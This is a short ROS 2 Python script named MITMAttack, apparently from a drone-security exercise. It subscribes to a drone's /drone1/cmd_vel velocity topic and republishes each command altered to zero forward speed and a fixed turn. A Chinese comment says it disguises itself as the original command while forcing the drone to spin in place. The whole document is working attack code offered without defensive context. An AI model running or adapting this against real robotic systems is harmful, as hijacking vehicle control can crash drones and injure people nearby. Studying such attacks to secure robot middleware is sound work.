import rclpy
from rclpy.node import Node
from geometry_msgs.msg import Twist

class MITMAttack(Node):
    def __init__(self):
        super().__init__('mitm_attacker')
        self.sub = self.create_subscription(Twist, '/drone1/cmd_vel', self.callback, 10)
        self.pub = self.create_publisher(Twist, '/drone1/cmd_vel', 10)

    def callback(self, msg):
        # 伪装成原指令但强行修改方向
        msg.linear.x = 0.0
        msg.angular.z = 1.5  # 原地旋转
        self.pub.publish(msg)

rclpy.init()
node = MITMAttack()
rclpy.spin(node)

